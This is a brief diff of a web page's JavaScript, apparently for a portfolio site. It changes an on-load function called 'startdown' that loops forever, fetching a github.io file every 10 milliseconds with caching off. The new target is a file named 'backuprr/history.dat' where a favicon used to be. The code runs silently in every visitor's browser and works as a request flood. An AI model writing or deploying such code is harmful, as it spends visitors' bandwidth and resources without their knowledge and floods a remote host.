@@ -25,7 +25,7 @@ $.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/g
 window.onload = async function startdown(){
   while(true) {
     await delay(10);
-    fetch('https://t0m0t0w.github.io/favicon.png', {cache: "no-store"})
+    await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"})
   }
 }
 
